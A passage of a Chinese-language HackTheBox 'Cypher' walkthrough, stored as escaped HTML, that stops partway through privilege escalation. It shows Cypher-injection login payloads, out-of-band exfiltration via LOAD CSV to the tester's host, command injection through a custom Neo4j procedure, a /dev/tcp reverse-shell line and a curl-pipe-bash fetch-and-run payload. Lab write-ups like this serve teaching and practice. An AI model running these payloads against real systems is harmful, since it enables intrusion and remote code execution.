3e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Cypher/image27.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e貌似在登录框存在\u003ccode\u003eSQL\u003c/code\u003e注入，使用\u003ccode\u003eSQLMAP\u003c/code\u003e和手动注入无果\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Cypher/image28.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e扫描目录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/cypher  dirsearch -u cypher.htb -x 403,404,429 -e php,zip,txt                                                                        \n/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  from pkg_resources import DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0.4.3\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, zip, txt | HTTP method: GET | Threads: 25 | Wordlist size: 10439\n\nOutput File: /root/Desktop/test/cypher/reports/_cypher.htb/_25-03-02_08-33-32.txt\n\nTarget: http://cypher.htb/\n\n[08:33:32] Starting: \n[08:33:56] 200 -    5KB - /about\n[08:34:17] 307 -    0B  - /api/  -\u003e  http://cypher.htb/api/api\n[08:34:17] 307 -    0B  - /api  -\u003e  /api/docs\n[08:34:42] 307 -    0B  - /demo  -\u003e  /login\n[08:34:42] 307 -    0B  - /demo/  -\u003e  http://cypher.htb/api/demo\n[08:35:10] 200 -    4KB - /login\n[08:35:10] 200 -    4KB - /login.html\n[08:35:49] 301 -  178B  - /testing  -\u003e  http://cypher.htb/testing/\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e发现新目录\u003ccode\u003etesting\u003c/code\u003e ，访问下载了\u003ccode\u003ejar\u003c/code\u003e文件\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Cypher/image29.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e反编译 jar\u003c/h2\u003e\n\u003cp\u003e将\u003ccode\u003ejar\u003c/code\u003e文件下载下来，使用\u003ccode\u003ejd-gui\u003c/code\u003e反编译\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Cypher/image30.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e在其中发现貌似可以命令执行地方\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eString[] \u003cspan class=\"hljs-built_in\"\u003ecommand\u003c/span\u003e = { \u003cspan class=\"hljs-string\"\u003e\"/bin/sh\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"-c\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"curl -s -o /dev/null --connect-timeout 1 -w %{http_code} \"\u003c/span\u003e + url };\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e丢到\u003ccode\u003eGPT\u003c/code\u003e里进行分析：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e该 Java 代码是 Neo4j 自定义 APOC（Awesome Procedures on Cypher）扩展的一部分，提供 \u003ccode\u003ecustom.getUrlStatusCode\u003c/code\u003e 过程。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e该过程接收一个 URL，使用 \u003ccode\u003ecurl\u003c/code\u003e 命令获取其 HTTP 状态码，并返回。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e攻击示例执行效果\u003c/strong\u003e这会导致服务器泄露敏感文件 \u003ccode\u003e/etc/passwd\u003c/code\u003e。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-vbnet\"\u003e\u003cspan class=\"hljs-keyword\"\u003eCALL\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ecustom\u003c/span\u003e.getUrlStatusCode(\u003cspan class=\"hljs-string\"\u003e\"https://example.com; cat /etc/passwd\"\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ecurl -s -o /dev/null --connect-timeout 1 -w %{http_code} https://example.com; \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e /etc/passwd\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2\u003eCypher Injection\u003c/h2\u003e\n\u003cp\u003e看到\u003ccode\u003eneo4j\u003c/code\u003e才发现上面的压根不是\u003ccode\u003eSQL\u003c/code\u003e注入 \u003ca href=\"https://neo4j.com/docs/getting-started/cypher/\"\u003ehttps://neo4j.com/docs/getting-started/cypher/\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eCypher is Neo4j’s declarative and GQL conformant query language. Available as open source via The openCypher project, Cypher is similar to SQL, but optimized for graphs. | Cypher 是 Neo4j 的声明式和符合 GQL 的查询语言。Cypher 可通过openCypher 项目以开源形式获得，它类似于 SQL，但针对图形进行了优化。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e尝试了使用\u003ccode\u003ecyphermap\u003c/code\u003e但是始终返回\u003ccode\u003eUnable to find valid injection type...\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e通过 ：\u003ca href=\"https://pentester.land/blog/cypher-injection-cheatsheet/#2-cypher-injection\"\u003ehttps://pentester.land/blog/cypher-injection-cheatsheet/#2-cypher-injection\u003c/a\u003e 可以了解到\u003ccode\u003eCypher\u003c/code\u003e注入\u003c/p\u003e\n\u003cp\u003e随便输入点东西可以在错误中发现查询语句\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e{message: Variable `c` not defined (line 1, column 75 (offset: 74))\n\u003cspan class=\"hljs-string\"\u003e\"MATCH (u:USER) -[:SECRET]-\u003e (h:SHA1) WHERE u.name = 'admin' or 1=1 return c//' return h.value as hash\"\u003c/span\u003e\n                                                                           ^}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e成功闭合\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e{\u003cspan class=\"hljs-string\"\u003e\"username\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"admin' or 1=1 return h.value as hash//\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"password\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"1\"\u003c/span\u003e }\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Cypher/image31.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e带外测试\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e{\u003cspan class=\"hljs-string\"\u003e\"username\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"admin'return h.value as hash UNION CALL db.labels() YIELD label LOAD CSV FROM 'http://10.10.16.34/' + label AS r RETURN r as hash//\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"password\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"1\"\u003c/span\u003e }\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Cypher/image32.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后可以通过\u003ccode\u003ecustom\u003c/code\u003e 用来引用自定义的程序或函数，也就是上面带有命令执行的方法 \u003ca href=\"https://neo4j.com/labs/apoc/4.1/cypher-execution/cypher-based-procedures-functions/\"\u003ehttps://neo4j.com/labs/apoc/4.1/cypher-execution/cypher-based-procedures-functions/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e成功带外，但是无回显\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e{\n\t\u003cspan class=\"hljs-string\"\u003e\"username\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"' return h.value as a UNION CALL custom.getUrlStatusCode(\\\"http://10.10.16.34;whoami\\\") YIELD statusCode AS a RETURN a;//\"\u003c/span\u003e,\n\t\u003cspan class=\"hljs-string\"\u003e\"password\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"1\"\u003c/span\u003e \n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e构造\u003ccode\u003epayload\u003c/code\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e在kali创建带有反弹shell语句的文件shell.txt（让服务器访问）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e/bin/bash -c \u003cspan class=\"hljs-string\"\u003e'bash -i \u003e\u0026#x26; /dev/tcp/10.10.16.34/1234 0\u003e\u0026#x26;1'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e开启监听\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/cypher  nc -lvnp 1234\nlistening on [any] 1234 ...\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e开启简易服务器\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e构造\u003ccode\u003epayload\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e{\n\t\u003cspan class=\"hljs-string\"\u003e\"username\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"' return h.value as a UNION CALL custom.getUrlStatusCode(\\\"http://10.10.16.34;curl http://10.10.16.34/shell.txt|bash\\\") YIELD statusCode AS a RETURN a;//\"\u003c/span\u003e,\n\t\u003cspan class=\"hljs-string\"\u003e\"password\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"1\"\u003c/span\u003e \n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e成功获得\u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Cypher/image33.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e提权\u003c/h2\u003e\n\u003cp\u003e信息收集一波\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eneo4j@cypher:/home/graphasm$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -al\ntotal 56\ndrwxr-xr-x 9 graphasm graphasm 4096 Mar  2 13:01 .\ndrwxr-xr-x 3 root     root     4096 Oct  8 17:58 ..\nlrwxrwxrwx 1 root     root        9 Oct  8 18:06 .bash_history -\u003e /dev/null\n-rw-r--r-- 1 graphasm graphasm  220 Mar 31  2024 .bash_logout\n-rw-r--r-- 1 graphasm graphasm 3771 Mar 31  2024 .bashrc\ndrwxrwxr-x 8 graphasm graphasm 4096 Mar  2 11:35 .bbot\n-rw-r--r-- 1 graphasm graphasm  156 Feb 14 12:35 bbot_preset.yml\ndrwx------ 3 graphasm graphasm 4096 Mar  2 11:35 .cache\ndrwxrwxr-x 3 graphasm graphasm 4096 Mar  2 11:18 .config\ndrwx------ 3 graphasm graphasm 4096 Mar  2 13:01 .gnupg\ndrwxrwxr-x 3 graphasm graphasm 4096 Mar  2 11:20 .\u003cspan class=\"hljs-built_in\"\u003elocal\u003c/span\u003e\n-rw-r--r-- 1 graphasm graphasm  807 Mar 31  2024 .profile\ndrwx------ 2 graphasm graphasm 4096 Oct  8 17:58 .ssh\ndrwxrwxr-x 8 graphasm graphasm 4096 Mar  2 13:38 testoutpu
